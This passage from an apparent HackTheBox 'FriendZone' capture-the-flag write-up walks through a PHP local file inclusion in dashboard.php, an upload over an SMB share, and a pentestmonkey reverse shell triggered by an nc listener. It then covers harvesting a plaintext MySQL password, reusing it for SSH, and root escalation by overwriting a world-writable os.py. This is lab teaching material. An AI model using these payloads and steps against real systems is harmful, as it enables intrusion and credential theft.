hvICI8Y2VudGVyPjxpbWcgc3JjPSdpbWFnZXMvJGltYWdlJz48L2NlbnRlcj4iOwoKIGVjaG8gIjxjZW50ZXI+PGgxPlNvbWV0aGluZyB3ZW50IHdvcm5nICEgLCB0aGUgc2NyaXB0IGluY2x1ZGUgd3JvbmcgcGFyYW0gITwvaDE+PC9jZW50ZXI+IjsKIGluY2x1ZGUoJF9HRVRbInBhZ2VuYW1lIl0uIi5waHAiKTsKIC8vZWNobyAkX0dFVFsicGFnZW5hbWUiXTsKIH0KfWVsc2V7CmVjaG8gIjxjZW50ZXI+PHA+WW91IGNhbid0IHNlZSB0aGUgY29udGVudCAhICwgcGxlYXNlIGxvZ2luICE8L2NlbnRlcj48L3A+IjsKfQo/Pgo= | base64 --decode
</span></code></pre></div>        </div>
        <p>The source code for <strong>dashboard.php</strong> appears:</p>
        <pre><code class="language-PHP">&lt;?php

//echo "&lt;center&gt;&lt;h2&gt;Smart photo script for friendzone corp !&lt;/h2&gt;&lt;/center&gt;";
//echo "&lt;center&gt;&lt;h3&gt;* Note : we are dealing with a beginner php developer andthe application is not tested yet !&lt;/h3&gt;&lt;/center&gt;";
echo "&lt;title&gt;FriendZone Admin !&lt;/title&gt;";
$auth = $_COOKIE["FriendZoneAuth"];

if ($auth === "e7749d0f4b4da5d03e6e9196fd1d18f1"){
  echo "&lt;br&gt;&lt;br&gt;&lt;br&gt;";

  echo "&lt;center&gt;&lt;h2&gt;Smart photo script for friendzone corp !&lt;/h2&gt;&lt;/center&gt;";
  echo "&lt;center&gt;&lt;h3&gt;* Note : we are dealing with a beginner php developer and the application is not tested yet !&lt;/h3&gt;&lt;/center&gt;";

  if(!isset($_GET["image_id"])){
    echo "&lt;br&gt;&lt;br&gt;";
    echo "&lt;center&gt;&lt;p&gt;image_name param is missed !&lt;/p&gt;&lt;/center&gt;";
    echo "&lt;center&gt;&lt;p&gt;please enter it to show the image&lt;/p&gt;&lt;/center&gt;";
    echo "&lt;center&gt;&lt;p&gt;default is image_id=a.jpg&amp;pagename=timestamp&lt;/p&gt;&lt;/center&gt;";
  } else {
    $image = $_GET["image_id"];
    echo "&lt;center&gt;&lt;img src='images/$image'&gt;&lt;/center&gt;";

    echo "&lt;center&gt;&lt;h1&gt;Something went worng ! , the script include wrong param !&lt;/h1&gt;&lt;/center&gt;";
    include($_GET["pagename"].".php");
    //echo $_GET["pagename"];
  }
} else {
  echo "&lt;center&gt;&lt;p&gt;You can't see the content ! , please login !&lt;/center&gt;&lt;/p&gt;";
}
?&gt;
</code></pre>
        <p><strong>NOTE(S)</strong>:</p>
        <ul>
          <li><strong>dashboard.php</strong> gets the filename of PHP files and then adds the extension <strong>.php</strong></li>
          <li><strong>dashboard.php</strong> runs the file from the pagename parameter</li>
          <li>Upload a malicious PHP file and access it using <strong>dashboard.php</strong>
            <blockquote>

            </blockquote>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Explore https://uploads.friendzone.red
    <ul>
      <li>Page Source:
        <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;title&gt;</span>FriendZone Escape software upload manager<span class="nt">&lt;/title&gt;</span>

<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;center&gt;&lt;h2&gt;</span>Want to upload Stuff ??<span class="nt">&lt;/h2&gt;&lt;/center&gt;</span>

<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"upload.php"</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span><span class="nt">&gt;</span>
    Select an image to upload (only images):
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"file"</span> <span class="na">name=</span><span class="s">"imageu"</span> <span class="na">id=</span><span class="s">"file"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"image"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Upload"</span> <span class="na">name=</span><span class="s">"Upload"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>

<span class="nt">&lt;/body&gt;</span>
</code></pre></div>        </div>
      </li>
      <li>Test if it accepts non-image files
        <ul>
          <li>Create payload (<strong>test.php</strong>)
            <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">echo "&lt;?php echo \"hello world\";</span><span class="w"> </span>?&gt;<span class="s2">" &gt; test.php
</span></code></pre></div>            </div>
          </li>
          <li>Response after uploading <strong>test.php</strong>
            <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Uploaded successfully !<span class="nt">&lt;br&gt;</span>1555476301
</code></pre></div>            </div>
          </li>
        </ul>

        <p><strong>NOTE(S)</strong>:</p>
        <ul>
          <li>It accepts non-image files</li>
          <li>The directory of the uploaded files is still unknown
            <blockquote>

            </blockquote>
          </li>
        </ul>
      </li>
      <li>Find the uploaded files
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">gobuster -k -u https://uploads.friendzone.red/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt 
</span><span class="gp">#</span><span class="w"> </span>/files <span class="o">(</span>Status: 301<span class="o">)</span>
<span class="go">     
gobuster -k -u https://uploads.friendzone.red/files -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt
</span><span class="gp">#</span><span class="w"> </span>/note <span class="o">(</span>Status: 200<span class="o">)</span>
</code></pre></div>        </div>
        <p>Visiting https://uploads.friendzone.red/files/note</p>
        <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>under development !
</code></pre></div>        </div>
        <p><strong>NOTE(S)</strong>:</p>
        <ul>
          <li>Perhaps âunder developmentâ points to the <strong>Development share</strong> from earlier
            <blockquote>

            </blockquote>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Check if <strong>test.php</strong> was really successfully uploaded
    <ul>
      <li>Reopen <strong>Development share</strong>:
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">smbclient \\\\WORKGROUP\\Development -I 10.10.10.123 -N
</span></code></pre></div>        </div>
        <p>While inside the client:</p>
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">dir
</span><span class="gp">#</span><span class="w"> </span><span class="nb">.</span>              D      0  Thu Jan 17 04:03:49 2019
<span class="gp">#</span><span class="w"> </span>..             D      0  Thu Jan 24 05:51:02 2019
</code></pre></div>        </div>
        <p><strong>NOTE(S)</strong>:</p>
        <ul>
          <li>The <strong>Development share</strong> is still empty
            <blockquote>

            </blockquote>
          </li>
        </ul>
      </li>
      <li>Try to read the source code of <strong>upload.php</strong>
        <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/dashboard.php?image_id=a.jpg&amp;pagename=php://filter/convert.base64-encode/resource=../uploads/upload
</code></pre></div>        </div>
        <p>Page Source:</p>
        <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;title&gt;</span>FriendZone Admin !<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;br&gt;&lt;br&gt;&lt;br&gt;</span>
<span class="nt">&lt;center&gt;&lt;h2&gt;</span>Smart photo script for friendzone corp !<span class="nt">&lt;/h2&gt;&lt;/center&gt;</span>
<span class="nt">&lt;center&gt;&lt;h3&gt;</span>* Note : we are dealing with a beginner php developer and the application is not tested yet !<span class="nt">&lt;/h3&gt;&lt;/center&gt;</span>
<span class="nt">&lt;center&gt;&lt;img</span> <span class="na">src=</span><span class="s">'images/a.jpg'</span><span class="nt">&gt;&lt;/center&gt;</span>
<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Something went worng ! , the script include wrong param !<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
PD9waHAKCi8vIG5vdCBmaW5pc2hlZCB5ZXQgLS0gZnJpZW5kem9uZSBhZG1pbiAhCgppZihpc3NldCgkX1BPU1RbImltYWdlIl0pKXsKCmVjaG8gIlVwbG9hZGVkIHN1Y2Nlc3NmdWxseSAhPGJyPiI7CmVjaG8gdGltZSgpKzM2MDA7Cn1lbHNlewoKZWNobyAiV0hBVCBBUkUgWU9VIFRSWUlORyBUTyBETyBIT09PT09PTUFOICEiOwoKfQoKPz4K
</code></pre></div>        </div>
        <p>Decoding the <strong>base64</strong> output:</p>
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">echo PD9waHAKCi8vIG5vdCBmaW5pc2hlZCB5ZXQgLS0gZnJpZW5kem9uZSBhZG1pbiAhCgppZihpc3NldCgkX1BPU1RbImltYWdlIl0pKXsKCmVjaG8gIlVwbG9hZGVkIHN1Y2Nlc3NmdWxseSAhPGJyPiI7CmVjaG8gdGltZSgpKzM2MDA7Cn1lbHNlewoKZWNobyAiV0hBVCBBUkUgWU9VIFRSWUlORyBUTyBETyBIT09PT09PTUFOICEiOwoKfQoKPz4K | base64 --decode
</span></code></pre></div>        </div>
        <p>The source code for <strong>../uploads/upload.php</strong> appears:</p>
        <pre><code class="language-PHP">&lt;?php

// not finished yet -- friendzone admin !

if(isset($_POST["image"])){

echo "Uploaded successfully !&lt;br&gt;";
echo time()+3600;
}else{

echo "WHAT ARE YOU TRYING TO DO HOOOOOOMAN !";

}

?&gt;
</code></pre>
        <p><strong>NOTE(S)</strong>:</p>
        <ul>
          <li>The uploaded file is not saved anywhereâ¦</li>
          <li>https://uploads.friendzone.red is actually a dead end
            <blockquote>

            </blockquote>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Linking the <strong>Development share</strong> and <strong>dashboard.php</strong>
    <ul>
      <li>Upload <strong>test.php</strong> directly to the <strong>Development share</strong>
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">smbclient \\\\WORKGROUP\\Development -c "put test.php test.php" -I 10.10.10.123 -N   
</span><span class="gp">#</span><span class="w"> </span>putting file test.php as <span class="se">\t</span>est.php <span class="o">(</span>0.0 kb/s<span class="o">)</span> <span class="o">(</span>average 0.0 kb/s<span class="o">)</span>
</code></pre></div>        </div>
        <p><strong>NOTE(S)</strong>:</p>
        <ul>
          <li><strong>/etc/Files</strong> was commented for the <strong>Files share</strong> during share enumeration in <code class="highlighter-rouge">enum4linux</code></li>
          <li>Maybe files in the <strong>Development share</strong> are saved in <strong>/etc/Development</strong>
            <blockquote>

            </blockquote>
          </li>
        </ul>
      </li>
      <li>Attempt LFI at the <strong>/etc/Development</strong> directory using <strong>dashboard.php</strong>
        <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/dashboard.php?image_id=a.jpg&amp;pagename=/etc/Development/test
</code></pre></div>        </div>
        <p>Page Source:</p>
        <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;title&gt;</span>FriendZone Admin !<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;br&gt;&lt;br&gt;&lt;br&gt;</span>
<span class="nt">&lt;center&gt;&lt;h2&gt;</span>Smart photo script for friendzone corp !<span class="nt">&lt;/h2&gt;&lt;/center&gt;</span>
<span class="nt">&lt;center&gt;&lt;h3&gt;</span>* Note : we are dealing with a beginner php developer and the application is not tested yet !<span class="nt">&lt;/h3&gt;&lt;/center&gt;</span>
<span class="nt">&lt;center&gt;&lt;img</span> <span class="na">src=</span><span class="s">'images/a.jpg'</span><span class="nt">&gt;&lt;/center&gt;</span>
<span class="nt">&lt;center&gt;&lt;h1&gt;</span>Something went worng ! , the script include wrong param !<span class="nt">&lt;/h1&gt;&lt;/center&gt;</span>
hello world
</code></pre></div>        </div>
        <p><strong>NOTE(S)</strong>:</p>
        <ul>
          <li>The files in the <strong>Development share</strong> are indeed saved in /etc/Development
            <blockquote>

            </blockquote>
          </li>
        </ul>
      </li>
      <li>Upload PHP reverse shell
        <ul>
          <li>Download shell from <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">pentestmonkey</a></li>
          <li>Update values of <strong>$ip</strong> and <strong>$port</strong></li>
          <li>Upload to the <strong>Development share</strong>
            <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">smbclient \\\\WORKGROUP\\Development -c "put shell.php shell.php" -I 10.10.10.123 -N
</span><span class="gp">#</span><span class="w"> </span>putting file shell.php as <span class="se">\s</span>hell.php <span class="o">(</span>7.0 kb/s<span class="o">)</span> <span class="o">(</span>average 7.0 kb/s<span class="o">)</span>
</code></pre></div>            </div>
          </li>
        </ul>
      </li>
      <li>Establish shell
        <ul>
          <li>Set-up local <strong>netcat listener</strong>:
            <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">nc -lvp 4444
</span></code></pre></div>            </div>
          </li>
          <li>Run shell using <strong>dashboard.php</strong>:
            <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=/etc/Development/shell
</code></pre></div>            </div>
          </li>
        </ul>
      </li>
      <li>While inside the shell:
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">id
</span><span class="gp">#</span><span class="w"> </span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
<span class="go">
cat /etc/passwd | grep bash
</span><span class="gp">#</span><span class="w"> </span>root:x:0:0:root:/root:/bin/bash
<span class="gp">#</span><span class="w"> </span>friend:x:1000:1000:friend,,,:/home/friend:/bin/bash
<span class="go">
</span><span class="gp">find /var/www -name *conf* 2&gt;</span>/dev/null
<span class="gp">#</span><span class="w"> </span>/var/www/mysql_data.conf
<span class="go">     
cat /var/www/mysql_data.conf
</span></code></pre></div>        </div>
        <p><strong>/var/www/mysql_data.conf</strong> contents:</p>
        <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
</code></pre></div>        </div>
        <p><strong>NOTE(S)</strong>:</p>
        <ul>
          <li>There exists a user named <strong>friend</strong></li>
          <li>There are credentials for <strong>friend</strong> in /var/www/mysql_data.conf
            <blockquote>

            </blockquote>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Login via SSH as user (<strong>friend</strong>)
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">ssh -l friend 10.10.10.123
</span><span class="gp">#</span><span class="w"> </span>friend@10.10.10.123<span class="s1">'s password: Agpyu12!0.213$
</span></code></pre></div>    </div>
    <ul>
      <li>While inside shell:
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">find ~ -name user.txt
</span><span class="gp">#</span><span class="w"> </span>/home/friend/user.txt
<span class="go">     
cat /home/friend/user.txt
</span><span class="gp">#</span><span class="w"> </span>a9ed20acecd6c5b6b52f474e15ae9a11
</code></pre></div>        </div>
      </li>
    </ul>
  </li>
</ol>

<hr />

<h2 id="part-4--privilege-escalation-friend---root">PART 4 : Privilege Escalation (friend -&gt; root)</h2>

<ol>
  <li>Download and upload <a href="https://github.com/DominicBreuker/pspy">pspy</a>
    <ol>
      <li>Check system architecture of FriendZone
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">uname -op
</span><span class="gp">#</span><span class="w"> </span>x86_64 GNU/Linux
</code></pre></div>        </div>
        <p><strong>NOTE(S)</strong>:</p>
        <ul>
          <li>The system runs on 64-bit
            <blockquote>

            </blockquote>
          </li>
        </ul>
      </li>
      <li>Upload <a href="https://github.com/DominicBreuker/pspy/releases/download/v1.0.0/pspy64">pspy64</a> to FriendZone
        <ul>
          <li>Local terminal:
            <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">python -m SimpleHTTPServer
</span><span class="gp">#</span><span class="w"> </span>Serving HTTP on 0.0.0.0 port 8000 ...
</code></pre></div>            </div>
          </li>
          <li>FriendZone terminal:
            <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">wget http://10.10.12.72:8000/pspy64
        
chmod +x pspy64
</span></code></pre></div>            </div>
          </li>
        </ul>
      </li>
    </ol>
  </li>
  <li>Run <strong>pspy64</strong>
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">./pspy64
</span><span class="gp">#</span><span class="w"> </span>...
<span class="gp">#</span><span class="w"> </span>54:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>7356   | /bin/sh <span class="nt">-c</span> /opt/server_admin/reporter.py 
<span class="gp">#</span><span class="w"> </span>54:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>7355   | /bin/sh <span class="nt">-c</span> /opt/server_admin/reporter.py 
<span class="gp">#</span><span class="w"> </span>54:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>7354   | /usr/sbin/CRON <span class="nt">-f</span>
<span class="gp">#</span><span class="w"> </span>...
<span class="gp">#</span><span class="w"> </span>56:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>7456   | /bin/sh <span class="nt">-c</span> /opt/server_admin/reporter.py 
<span class="gp">#</span><span class="w"> </span>56:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>7455   | /bin/sh <span class="nt">-c</span> /opt/server_admin/reporter.py 
<span class="gp">#</span><span class="w"> </span>56:01 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>7454   | /usr/sbin/CRON <span class="nt">-f</span> 
<span class="gp">#</span><span class="w"> </span>...
<span class="gp">#</span><span class="w"> </span>58:02 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>7540   | /bin/sh <span class="nt">-c</span> /opt/server_admin/reporter.py 
<span class="gp">#</span><span class="w"> </span>58:02 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>7539   | /bin/sh <span class="nt">-c</span> /opt/server_admin/reporter.py 
<span class="gp">#</span><span class="w"> </span>58:02 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>7538   | /usr/sbin/CRON <span class="nt">-f</span>
<span class="gp">#</span><span class="w"> </span>...
</code></pre></div>    </div>
    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li>There is a script called <strong>reporter.py</strong></li>
      <li>It runs every two minutes
        <blockquote>

        </blockquote>
      </li>
    </ul>
  </li>
  <li>Check <strong>reporter.py</strong>
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">cat /opt/server_admin/reporter.py
</span></code></pre></div>    </div>
    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="n">to_address</span> <span class="o">=</span> <span class="s">"admin1@friendzone.com"</span>
<span class="n">from_address</span> <span class="o">=</span> <span class="s">"admin2@friendzone.com"</span>

<span class="k">print</span> <span class="s">"[+] Trying to send email to </span><span class="si">%</span><span class="s">s"</span><span class="o">%</span><span class="n">to_address</span>

<span class="c1">#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''
</span>
<span class="c1">#os.system(command)
</span>
<span class="c1"># I need to edit the script later
# Sam ~ python developer
</span></code></pre></div>    </div>
    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li>The script runs in python2.7</li>
      <li>Maybe we can override the <strong>os</strong> library
        <blockquote>

        </blockquote>
      </li>
    </ul>
  </li>
  <li>Override the <strong>os</strong> library
    <ul>
      <li>Check the directory of <strong>reporter.py</strong>
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">ls -la /opt | grep server_admin
</span><span class="gp">#</span><span class="w"> </span>drwxr-xr-x  2 root root 4096 Jan 24 00:57 server_admin
</code></pre></div>        </div>
        <p><strong>NOTE(S)</strong>:</p>
        <ul>
          <li>Non-root users cannot write to the directory
            <blockquote>

            </blockquote>
          </li>
        </ul>
      </li>
      <li>Check where <strong>os.py</strong> is saved
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">find / -name os.py 2&gt;</span>/dev/null
<span class="gp">#</span><span class="w"> </span>/usr/lib/python3.6/os.py
<span class="gp">#</span><span class="w"> </span>/usr/lib/python2.7/os.py
<span class="go">     
ls -la /usr/lib/python2.7/os.py
</span><span class="gp">#</span><span class="w"> </span><span class="nt">-rwxrwxrwx</span> 1 root root 25912 Apr 17 08:33 /usr/lib/python2.7/os.py
</code></pre></div>        </div>
        <p><strong>NOTE(S)</strong>:</p>
        <ul>
          <li><strong>os.py</strong> could be overwritten by anyone
            <blockquote>

            </blockquote>
          </li>
        </ul>
      </li>
      <li>Overwrite <strong>os.py</strong>
        <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">echo "infile = open(\"/root/root.txt\", \"r\").read()" &gt;</span><span class="w"> </span>/usr/lib/python2.7/os.py
<span class="gp">echo "outfile = open(\"/tmp/root.txt\", \"w\").write(infile)" &gt;</span><span class="o">&gt;</span> /usr/lib/python2.7/os.py
<span class="gp">echo "outfile.close()" &gt;</span><span class="o">&gt;</span> /usr/lib/python2.7/os.py
</code></pre></div>        </div>
      </li>
    </ul>
  </li>
  <li>After <strong>reporter.py</strong> runs again:
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">cat /tmp/root.txt
</span><span class="gp">#</span><span class="w"> </span>b0e6c60b82cf96e9855ac1656a9e90c7
</code></pre></div>    </div>
  </li>
</ol>
:ET